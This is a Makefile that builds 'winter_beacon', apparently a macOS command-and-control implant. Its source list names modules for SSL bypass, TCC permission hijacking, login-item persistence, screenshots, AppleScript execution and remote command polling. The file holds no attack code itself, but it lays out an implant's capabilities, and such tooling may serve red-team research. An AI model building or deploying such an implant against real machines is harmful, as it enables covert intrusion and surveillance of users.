CC = clang
CFLAGS = -Wall -Wextra -g -O0 -framework Foundation -framework Security -framework AppKit -framework ScreenCaptureKit -framework CoreMedia -framework CoreImage -ObjC -I. -mmacosx-version-min=12.3
LDFLAGS = -framework Foundation -framework Security -framework AppKit -framework ScreenCaptureKit -framework CoreMedia -framework CoreImage

# Source files
SOURCES = main.m ZBeacon.m ZAPIClient.m ZSSLBypass.m ZSystemInfo.m \
          ZCommandModel.m ZCommandHandler.m ZCommandRegistry.m ZCommandService.m \
          ZCommandPoller.m ZCommandReporter.m ZCommandExecutor.m \
          commands/ZEchoCommandHandler.m commands/ZDialogCommandHandler.m commands/ZWhoAmICommandHandler.m commands/ZTCCJackCommandHandler.m commands/ZLoginItemCommandHandler.m commands/ZTCCCheckCommandHandler.m \
          commands/ZScreenshotCommandHandler.m commands/ZLSCommandHandler.m commands/ZPWDCommandHandler.m commands/ZAppleScriptCommandHandler.m
OBJECTS = $(SOURCES:.m=.o)
TARGET = winter_beacon

# Debug mode flags
DEBUG ?= 1
ifeq ($(DEBUG), 1)
	CFLAGS += -DDEBUG=1 -fno-omit-frame-pointer
else
	CFLAGS += -DDEBUG=0 -O2
endif

all: $(TARGET)

# Rule to link the final executable
$(TARGET): $(OBJECTS)
	@echo "Linking $@..."
	@$(CC) $(CFLAGS) -o $@ $(OBJECTS) $(LDFLAGS)
	@echo "Build complete: $@"
	@echo "Run with: ./$(TARGET) --url=https://localhost:4444"

# Rule to compile .m files to .o files
%.o: %.m
	@echo "Compiling $<..."
	@$(CC) $(CFLAGS) -c $< -o $@

# Clean rule
clean:
	@echo "Cleaning build artifacts..."
	@rm -f $(TARGET) $(OBJECTS)
	@rm -rf *.dSYM
	@echo "Clean complete"

# Run target
run: $(TARGET)
	@echo "Running $(TARGET)..."
	@./$(TARGET)

# Debug run target
debug: $(TARGET)
	@echo "Running $(TARGET) in debug mode..."
	@./$(TARGET) --debug

.PHONY: all clean run debug 